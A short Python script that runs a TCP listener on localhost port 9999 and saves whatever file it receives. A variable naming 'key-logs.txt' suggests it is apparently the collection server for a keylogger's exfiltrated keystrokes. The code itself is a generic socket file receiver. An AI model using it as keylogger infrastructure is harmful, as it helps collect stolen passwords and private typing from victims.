import os
import socket
import sys


files = ['key-logs.txt']

s = socket.socket()
s.bind(("localhost",9999))  # edit hostname and port here
s.listen(10)

print('listening on port: 9999')    # edit port here
while True:
    sc, address = s.accept()
    print('Got connection from:', address)
    
    try:
        with open('server-copy.txt', 'wb') as f:
            # Receive entire file in chunks
            while True:
                data = sc.recv(1024)
                if not data:
                    break
                f.write(data)
        
        print('File received and saved as server-copy.txt')
        
    except Exception as e:
        print(f'Error: {e}')
    
    finally:
        sc.close()
        print('Connection closed\n')